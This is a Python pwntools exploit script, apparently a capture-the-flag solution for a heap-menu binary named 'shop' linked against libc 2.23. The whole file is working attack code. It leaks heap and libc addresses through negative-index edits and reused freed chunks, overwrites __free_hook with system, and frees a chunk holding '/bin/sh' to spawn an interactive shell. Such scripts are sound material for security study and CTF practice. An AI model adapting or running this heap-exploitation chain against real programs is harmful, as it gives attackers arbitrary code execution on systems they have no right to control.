from pwn import *
context.log_level = 'debug'
prog = './shop'
elf = ELF(prog)
p = process(prog)
libc = ELF("./libc-2.23.so")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()

def get(content):
	p.sendlineafter("EMMmmm, you will be a rich man!\n", '1')
	p.sendlineafter("Dollar?\n", content)
def add(size, content):
	p.sendlineafter("buy!\n", '1')
	p.sendlineafter("How long is your goods name?\n", str(size))
	p.sendlineafter("What is your goods name?\n", content)
def edit(idx, content):
	p.sendlineafter("buy!\n", '3')
	p.sendlineafter("modify?\n", str(idx))
	p.sendafter("to?\n", content)
def leak(idx):
	p.sendlineafter("buy!\n", '3')
	p.sendlineafter("modify?\n", str(idx))
	p.recvuntil("modify ")
	addr = u64(p.recv(6)+'\x00'*2)
	p.sendline("a")
	return addr
def free(idx):
	p.sendlineafter("buy!\n", '2')
	p.sendlineafter("need?\n", str(idx))
def exp():
	for i in range(20):
		get(str(i))
	p.sendlineafter("EMMmmm, you will be a rich man!\n", '3')
	add(0, '')#0
	add(0, '')#1
	free(1)
	free(0)
	add(0, '')#2
	heap_addr = leak(2)
	success("heap_addr == > " + hex(heap_addr))
	add(0x80, '')#3
	add(0, '')#4
	free(3)
	add(0, '')#5
	libc_base = leak(5)-3951608
	success("libc_base == > " + hex(libc_base))
	add(0x20, '/bin/sh\x00'+p64(libc.sym['__free_hook']+libc_base)+p64(0))#6
	target_addr = heap_addr + 0x778-0x6e0
	edit(-1, p64(target_addr))
	edit(-21, p64(libc.sym['system'] + libc_base))
	free(6)
	#dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
